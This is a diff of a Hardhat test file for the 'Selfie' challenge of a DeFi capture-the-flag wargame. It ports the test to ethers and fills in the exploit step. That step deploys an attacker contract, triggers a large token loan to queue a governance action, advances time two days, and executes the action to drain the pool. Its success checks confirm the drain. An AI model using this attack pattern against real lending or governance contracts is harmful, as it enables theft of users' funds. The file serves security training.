@@ -1,48 +1,57 @@
-const { ether, time } = require('@openzeppelin/test-helpers');
-const { accounts, contract } = require('@openzeppelin/test-environment');
-
-const DamnValuableTokenSnapshot = contract.fromArtifact('DamnValuableTokenSnapshot');
-const SelfiePool = contract.fromArtifact('SelfiePool');
-const SimpleGovernance = contract.fromArtifact('SimpleGovernance');
-
+const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] Selfie', function () {
+    let deployer, attacker;
 
-    const [deployer, attacker, ...otherAccounts] = accounts;
-
-    const TOKEN_INITIAL_SUPPLY = ether('2000000')
-    const TOKENS_IN_POOL = ether('1500000');
+    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
+    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
     
-
     before(async function () {
-        /** SETUP SCENARIO */
-        this.token = await DamnValuableTokenSnapshot.new(TOKEN_INITIAL_SUPPLY, { from: deployer });
-        this.governance = await SimpleGovernance.new(this.token.address, { from: deployer });
-        this.pool = await SelfiePool.new(
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+        [deployer, attacker] = await ethers.getSigners();
+
+        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
+        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
+        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
+
+        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
+        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
+        this.pool = await SelfiePoolFactory.deploy(
             this.token.address,
-            this.governance.address, 
-            { from: deployer }
+            this.governance.address    
         );
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL, { from: deployer });
+        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
         expect(
             await this.token.balanceOf(this.pool.address)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);
+        ).to.be.equal(TOKENS_IN_POOL);
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        /** CODE YOUR EXPLOIT HERE */
+        const SnapAttackFactory = await ethers.getContractFactory('SnapAttack', attacker);
+        this.SnapAttack = await SnapAttackFactory.deploy(this.governance.address, this.pool.address);
+
+        await this.SnapAttack.connect(attacker).attack(ethers.utils.parseEther("1500000"),attacker.address);
+        var actionId = await this.SnapAttack.actionId()
+
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        await this.SnapAttack.connect(attacker).executeRemoteFunc(actionId.toNumber());
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+
+        // Attacker has taken all tokens from the pool
         expect(
-            await this.token.balanceOf(attacker)
-        ).to.be.bignumber.equal(TOKENS_IN_POOL);        
+            await this.token.balanceOf(attacker.address)
+        ).to.be.equal(TOKENS_IN_POOL);        
         expect(
             await this.token.balanceOf(this.pool.address)
-        ).to.be.bignumber.equal('0');
+        ).to.be.equal('0');
     });
 });
